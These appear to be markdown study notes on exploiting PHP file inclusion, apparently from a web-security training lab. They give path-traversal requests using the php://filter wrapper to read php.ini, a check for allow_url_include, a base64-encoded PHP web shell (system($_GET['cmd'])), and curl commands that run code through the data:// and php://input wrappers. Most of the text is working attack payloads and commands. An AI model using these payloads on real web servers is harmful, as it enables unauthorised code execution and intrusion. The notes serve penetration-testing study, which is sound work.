- - -
## Check For "allow_url_include"  : 

#### Veritfy that it is enabled or not..

```php
php://filter/read=convert.base64-encode/resource=../../../../etc/php/<|PHP-VERSION|>/apache2/php.in

php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.in
```

Once we have the **base64 encoded string**, we can **decode it** and **grep** for **allow_url_include** to see its value:

```sh
echo 'W1BIUF0KCjs7Ozs7Ozs7O...REDACTED...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

> [!tip] 
>  It is not uncommon to see this option enabled, as many web applications rely on it to function properly, like some WordPress plugins and themes, for example.

#### If Enabled, Use Data or Input Filters : 
This Options has the ability to decode them and **execute the PHP code**.

```sh
echo '<?php system($_GET["cmd"]); ?>' | base64
```

With **Data** Filter.
```sh
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

> [!info] 
> Similar to the **data wrapper**, the **input wrapper** can be used to include external input and **execute PHP code**. The difference between it and the data wrapper is that we pass our input to the input wrapper as a **POST request's data**.

With **Input** Filter.
```sh
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

- - -
